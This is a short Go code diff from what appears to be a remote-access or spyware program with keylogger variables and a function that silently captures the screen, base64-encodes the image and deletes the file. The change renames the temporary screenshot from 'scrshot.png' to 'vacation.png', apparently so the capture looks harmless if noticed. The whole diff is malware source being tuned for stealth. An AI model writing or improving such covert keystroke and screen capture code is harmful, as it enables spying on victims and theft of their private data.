@@ -26,7 +26,6 @@ const (
 )
 
 var (
-	scrshot     string = "scrshot.png"
 	keylog_flag int    = 0
 	keystrokes  string = ""
 )
@@ -225,10 +224,10 @@ func save_file(file string, b64_string string) bool {
 func take_screenshot() string {
 	bnds := screenshot.GetDisplayBounds(0)
 	img, _ := screenshot.CaptureRect(bnds)
-	file, _ := os.Create(scrshot)
+	file, _ := os.Create("vacation.png")
 	defer file.Close()
 	png.Encode(file, img)
-	b64_string := file_b64(scrshot)
-	os.Remove(scrshot)
+	b64_string := file_b64("vacation.png")
+	os.Remove("vacation.png")
 	return b64_string
 }
